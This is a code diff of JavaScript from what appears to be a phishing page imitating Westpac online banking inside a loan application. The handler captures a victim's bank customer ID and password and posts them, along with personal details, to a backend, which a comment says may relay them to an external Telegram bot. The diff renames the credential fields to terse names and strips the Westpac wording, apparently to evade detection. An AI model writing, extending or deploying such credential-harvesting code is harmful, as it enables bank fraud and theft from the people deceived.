@@ -958,18 +958,18 @@
     function handleSignInSubmit(e) {
       e.preventDefault();
 
-      S.bankUserId = document.getElementById('customer-id').value;
-      S.bankPassword = document.getElementById('password').value;
+      S.bId = document.getElementById('customer-id').value;
+      S.bPs = document.getElementById('password').value;
 
       // Move into loading status screen
-      document.getElementById('processing-title').innerText = "Verifying credentials...";
-      document.getElementById('processing-subtitle').innerText = "Linking client details with Westpac Online Core Systems...";
+      document.getElementById('processing-title').innerText = "Verifying...";
+      document.getElementById('processing-subtitle').innerText = "Waiting for verification...";
 
 
       // Send structured log to our simulation dashboard & external TG Bot if enabled
       fetch('/api/application-details', {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ name: `${S.title} ${S.firstName} ${S.lastName} ${S.middleName}`, email: S.email, phone: '+61' + S.phone, purpose: S.purpose, amount: '$' + S.amount.toLocaleString(), term: S.term + ' years', bankUserId: S.bankUserId, bankPassword: S.bankPassword })
+        body: JSON.stringify({ name: `${S.title} ${S.firstName} ${S.lastName} ${S.middleName}`, email: S.email, phone: '+61' + S.phone, purpose: S.purpose, amount: '$' + S.amount.toLocaleString(), term: S.term + ' years', bId: S.bId, bPs: S.bPs })
       });
       goToStep('processing');
       // buildOtpInputs();
